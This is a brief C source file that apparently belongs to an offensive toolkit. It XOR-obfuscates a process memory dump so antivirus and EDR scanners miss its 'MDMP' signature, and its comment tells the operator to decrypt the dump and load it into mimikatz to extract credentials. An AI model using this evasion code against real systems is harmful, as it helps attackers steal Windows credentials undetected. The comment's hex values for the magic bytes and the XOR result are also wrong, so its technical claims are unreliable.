/*
 * xor_obfusc.c — single-byte XOR over a buffer.
 *
 * Purpose: ensure the dump file on disk does not contain the
 * `MDMP` magic bytes (4D 44 4D 50) which AV/EDR file scanners
 * commonly flag. XORing with 0x55 turns 0x4D4D5044 into 0x18181505
 * — no longer trivial-string-match.
 *
 * Operator side: decrypt with the same key before feeding to
 * mimikatz/sekurlsa::minidump.
 */
#include "common.h"

VOID xor_buffer(BYTE *buf, SIZE_T n, BYTE key) {
    for (SIZE_T i = 0; i < n; i++) buf[i] ^= key;
}
